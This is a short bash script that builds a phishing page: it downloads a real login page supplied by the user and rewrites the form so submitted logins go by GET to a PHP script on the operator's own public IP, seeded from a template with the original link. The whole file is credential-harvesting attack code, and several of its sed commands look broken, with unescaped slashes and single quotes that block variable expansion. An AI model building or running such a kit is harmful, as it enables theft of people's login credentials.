#!/bin/bash

# Get host public IPv4 address
ip=$(curl -s ifconfig.me)
# Get a legitimate login page link
printf "Please provide a login page link: "
read page

# Fetch login page source code
curl -sL $page > login.html
# Replace the 'action' and 'method' form attributes
sed -i 's/action="[^"]*/action="http://$ip/login.php' login.html
sed -i 's/method="[^"]*/method="get/' login.html

# Create php script from php template
cp template.php login.php
sed -i 's/PAGELINK/$page' login.php
